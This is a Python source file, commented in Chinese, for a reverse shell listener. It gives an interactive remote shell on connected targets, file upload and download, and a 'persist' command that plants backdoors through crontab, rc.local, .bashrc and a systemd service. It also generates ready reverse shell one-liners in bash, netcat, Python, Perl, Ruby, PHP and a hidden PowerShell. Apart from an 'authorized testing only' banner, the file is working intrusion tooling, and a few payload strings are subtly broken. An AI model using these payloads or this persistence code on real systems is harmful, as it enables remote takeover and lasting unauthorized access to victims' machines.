#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
反向Shell监听器
支持多种Shell类型和高级功能
仅用于授权的安全测试
"""

import socket
import threading
import time
import subprocess
import os
import sys
import argparse
import ssl
import base64
import json
from datetime import datetime
import logging

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ReverseShellListener:
    """反向Shell监听器"""

    def __init__(self, host='0.0.0.0', port=4444, use_ssl=False, cert_file=None, key_file=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.cert_file = cert_file
        self.key_file = key_file
        self.client_socket = None
        self.client_address = None
        self.is_connected = False
        self.connection_history = []

    def start_listener(self):
        """启动监听器"""
        try:
            # 创建socket
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # SSL包装
            if self.use_ssl and self.cert_file and self.key_file:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                server_socket = context.wrap_socket(server_socket, server_side=True)
                logger.info(f"SSL监听器启动在 {self.host}:{self.port}")
            else:
                logger.info(f"监听器启动在 {self.host}:{self.port}")

            # 绑定和监听
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)

            print(f"🎯 反向Shell监听器已启动")
            print(f"📍 监听地址: {self.host}:{self.port}")
            print(f"🔒 SSL状态: {'启用' if self.use_ssl else '禁用'}")
            print(f"⏰ 启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("=" * 60)
            print("等待反向Shell连接...")

            # 接受连接
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    self.client_socket = client_socket
                    self.client_address = client_address
                    self.is_connected = True

                    # 记录连接历史
                    connection_info = {
                        'timestamp': datetime.now().isoformat(),
                        'address': client_address,
                        'user_info': None
                    }
                    self.connection_history.append(connection_info)

                    print(f"\n🔥 收到连接来自: {client_address}")
                    print(f"⏰ 连接时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

                    # 获取系统信息
                    system_info = self.get_system_info()
                    if system_info:
                        print(f"💻 系统信息:")
                        for key, value in system_info.items():
                            print(f"   {key}: {value}")

                    # 启动交互式shell
                    self.interactive_shell()

                except KeyboardInterrupt:
                    print("\n⚠️  监听器已停止")
                    break
                except Exception as e:
                    logger.error(f"连接处理错误: {e}")
                    continue

        except Exception as e:
            logger.error(f"监听器启动失败: {e}")
        finally:
            if 'server_socket' in locals():
                server_socket.close()

    def get_system_info(self):
        """获取系统信息"""
        try:
            # 发送系统信息收集命令
            commands = {
                'hostname': 'hostname',
                'whoami': 'whoami',
                'id': 'id',
                'pwd': 'pwd',
                'uname': 'uname -a',
                'os_info': 'cat /etc/os-release 2>/dev/null || echo "Unknown"'
            }

            system_info = {}
            for key, cmd in commands.items():
                try:
                    result = self.execute_command(cmd, timeout=3)
                    if result:
                        system_info[key] = result.strip()
                except:
                    pass

            return system_info

        except Exception as e:
            logger.error(f"获取系统信息失败: {e}")
            return {}

    def execute_command(self, command, timeout=10):
        """执行命令"""
        try:
            if not self.is_connected or not self.client_socket:
                return None

            # 发送命令
            self.client_socket.send(command.encode() + b'\n')

            # 设置超时
            self.client_socket.settimeout(timeout)

            # 接收结果
            result = b''
            while True:
                try:
                    data = self.client_socket.recv(4096)
                    if not data:
                        break
                    result += data

                    # 检查命令结束符
                    if result.endswith(b'$ ') or result.endswith(b'# '):
                        break

                except socket.timeout:
                    break

            return result.decode('utf-8', errors='ignore')

        except Exception as e:
            logger.error(f"命令执行失败: {e}")
            return None

    def interactive_shell(self):
        """交互式Shell"""
        print(f"\n🚀 交互式Shell已启动")
        print(f"🎯 目标: {self.client_address[0]}")
        print(f"💡 输入 'help' 查看帮助，输入 'exit' 退出")
        print("=" * 60)

        while self.is_connected:
            try:
                command = input(f"[{self.client_address[0]}]$ ").strip()

                if not command:
                    continue

                if command.lower() == 'exit':
                    print("🔚 断开连接")
                    self.disconnect()
                    break

                elif command.lower() == 'help':
                    self.show_help()
                    continue

                elif command.lower() == 'info':
                    self.show_connection_info()
                    continue

                elif command.lower() == 'upgrade':
                    self.upgrade_shell()
                    continue

                elif command.lower().startswith('upload '):
                    self.upload_file(command)
                    continue

                elif command.lower().startswith('download '):
                    self.download_file(command)
                    continue

                elif command.lower() == 'persist':
                    self.establish_persistence()
                    continue

                # 执行普通命令
                print(f"📤 执行命令: {command}")
                result = self.execute_command(command)

                if result:
                    print(f"📥 输出:")
                    print(result)
                else:
                    print("❌ 命令执行失败或无输出")

            except KeyboardInterrupt:
                print("\n🔚 断开连接")
                self.disconnect()
                break
            except Exception as e:
                print(f"❌ Shell错误: {e}")
                self.disconnect()
                break

    def show_help(self):
        """显示帮助"""
        help_text = """
🔧 可用命令:
  help              - 显示此帮助
  info              - 显示连接信息
  upgrade           - 升级到完全交互式shell
  upload <file>     - 上传文件到目标
  download <file>   - 从目标下载文件
  persist           - 建立持久化后门
  exit              - 断开连接

💡 高级技巧:
  - 使用 'python -c "import pty; pty.spawn('/bin/bash')"' 升级shell
  - 使用 'which bash' 检查shell可用性
  - 使用 'netstat -tulpn' 查看网络连接
        """
        print(help_text)

    def show_connection_info(self):
        """显示连接信息"""
        if self.client_address:
            print(f"\n📊 连接信息:")
            print(f"   🎯 目标IP: {self.client_address[0]}")
            print(f"   🔌 目标端口: {self.client_address[1]}")
            print(f"   ⏰ 连接时长: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"   🔒 SSL状态: {'启用' if self.use_ssl else '禁用'}")

            if self.connection_history:
                print(f"   📈 历史连接数: {len(self.connection_history)}")

    def upgrade_shell(self):
        """升级Shell"""
        print("🚀 尝试升级到完全交互式shell...")

        upgrade_commands = [
            'python -c "import pty; pty.spawn(\'/bin/bash\')"',
            'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
            'script -qc /bin/bash /dev/null',
            '/bin/bash -i',
            'bash -i'
        ]

        for cmd in upgrade_commands:
            try:
                result = self.execute_command(cmd, timeout=5)
                if result and 'bash' in result.lower():
                    print(f"✅ Shell升级成功: {cmd}")
                    return
            except:
                continue

        print("❌ Shell升级失败")

    def upload_file(self, command):
        """上传文件"""
        try:
            filename = command.split(' ', 1)[1]
            if not os.path.exists(filename):
                print(f"❌ 文件不存在: {filename}")
                return

            # 读取文件内容
            with open(filename, 'rb') as f:
                content = f.read()

            # Base64编码传输
            encoded_content = base64.b64encode(content).decode()

            # 发送文件
            upload_cmd = f"echo '{encoded_content}' | base64 -d > /tmp/{os.path.basename(filename)}"
            result = self.execute_command(upload_cmd)

            if result is not None:
                print(f"✅ 文件上传成功: /tmp/{os.path.basename(filename)}")
            else:
                print("❌ 文件上传失败")

        except Exception as e:
            print(f"❌ 上传错误: {e}")

    def download_file(self, command):
        """下载文件"""
        try:
            filename = command.split(' ', 1)[1]

            # 读取文件并Base64编码
            read_cmd = f"cat '{filename}' 2>/dev/null | base64"
            result = self.execute_command(read_cmd)

            if result:
                try:
                    # 解码并保存
                    decoded_content = base64.b64decode(result)
                    save_filename = f"downloaded_{os.path.basename(filename)}"

                    with open(save_filename, 'wb') as f:
                        f.write(decoded_content)

                    print(f"✅ 文件下载成功: {save_filename}")
                except:
                    print("❌ 文件解码失败")
            else:
                print("❌ 文件下载失败")

        except Exception as e:
            print(f"❌ 下载错误: {e}")

    def establish_persistence(self):
        """建立持久化"""
        print("🔗 尝试建立持久化后门...")

        persistence_methods = [
            # Cron任务
            "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{self.host}/{self.port} 0>&1\"' | crontab -",
            # 启动项
            f"echo 'bash -c \"bash -i >& /dev/tcp/{self.host}/{self.port} 0>&1\"' >> /etc/rc.local",
            # 用户配置文件
            f"echo 'bash -c \"bash -i >& /dev/tcp/{self.host}/{self.port} 0>&1\"' >> ~/.bashrc",
            # Systemd服务
            """cat > /tmp/persist.service << 'EOF'
[Unit]
Description=Persistence Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/{self.host}/{self.port} 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
sudo mv /tmp/persist.service /etc/systemd/system/
sudo systemctl enable persist.service
sudo systemctl start persist.service"""
        ]

        for i, method in enumerate(persistence_methods):
            try:
                result = self.execute_command(method, timeout=10)
                print(f"🔗 尝试持久化方法 {i+1}: {'✅ 成功' if result is not None else '❌ 失败'}")
                time.sleep(1)
            except:
                print(f"🔗 尝试持久化方法 {i+1}: ❌ 失败")

        print("🔗 持久化建立完成，检查目标系统确认")

    def disconnect(self):
        """断开连接"""
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass

        self.is_connected = False
        self.client_socket = None
        self.client_address = None

        print("🔚 连接已断开，等待新的连接...")

def generate_payloads(listener_ip, listener_port, shell_type='bash'):
    """生成反向Shell载荷"""

    # 定义模板字符串
    perl_template = 'perl -e \'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\''

    ruby_template = 'ruby -rsocket -e\'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\''

    php_template = 'php -r \'$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");\''

    ps_template = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\\'{ip}\\',{port});$stream = $client.GetStream();while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = [System.Text.Encoding]::ASCII.GetString($bytes,0,$i);iex $data 2>&1}};$client.Close()\"'

    payloads = {
        'bash': f"bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'",
        'netcat': f"nc -e /bin/bash {listener_ip} {listener_port}",
        'netcat_openbsd': f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {listener_ip} {listener_port} > /tmp/f",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
        'perl': perl_template.format(ip=listener_ip, port=listener_port),
        'ruby': ruby_template.format(ip=listener_ip, port=listener_port),
        'php': php_template.format(ip=listener_ip, port=listener_port),
        'powershell': ps_template.format(ip=listener_ip, port=listener_port)
    }

    return payloads

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='反向Shell监听器')
    parser.add_argument('--host', default='0.0.0.0', help='监听地址')
    parser.add_argument('--port', type=int, default=4444, help='监听端口')
    parser.add_argument('--ssl', action='store_true', help='启用SSL')
    parser.add_argument('--cert', help='SSL证书文件')
    parser.add_argument('--key', help='SSL私钥文件')
    parser.add_argument('--payloads', action='store_true', help='生成载荷')
    parser.add_argument('--payload-ip', help='载荷IP地址')
    parser.add_argument('--payload-port', type=int, help='载荷端口')

    args = parser.parse_args()

    # 显示banner
    print("🎯 反向Shell监听器 v2.0")
    print("=" * 60)
    print("⚠️  仅用于授权的安全测试")
    print("=" * 60)

    # 生成载荷
    if args.payloads and args.payload_ip and args.payload_port:
        print(f"📡 生成反向Shell载荷")
        print(f"🎯 目标: {args.payload_ip}:{args.payload_port}")
        print("=" * 60)

        payloads = generate_payloads(args.payload_ip, args.payload_port)

        for shell_type, payload in payloads.items():
            print(f"\n🔸 {shell_type.upper()}:")
            print(f"   {payload}")

        print(f"\n💡 使用方法:")
        print(f"   1. 启动监听器: python {sys.argv[0]} --host {args.payload_ip} --port {args.payload_port}")
        print(f"   2. 在目标系统执行上述载荷之一")
        return

    # 启动监听器
    listener = ReverseShellListener(
        host=args.host,
        port=args.port,
        use_ssl=args.ssl,
        cert_file=args.cert,
        key_file=args.key
    )

    # 显示载荷生成提示
    print(f"\n💡 要生成载荷，请使用:")
    print(f"   python {sys.argv[0]} --payloads --payload-ip YOUR_IP --payload-port {args.port}")
    print(f"   (将YOUR_IP替换为您的公网IP地址)")
    print()

    try:
        listener.start_listener()
    except KeyboardInterrupt:
        print("\n🔚 监听器已停止")

if __name__ == "__main__":
    main()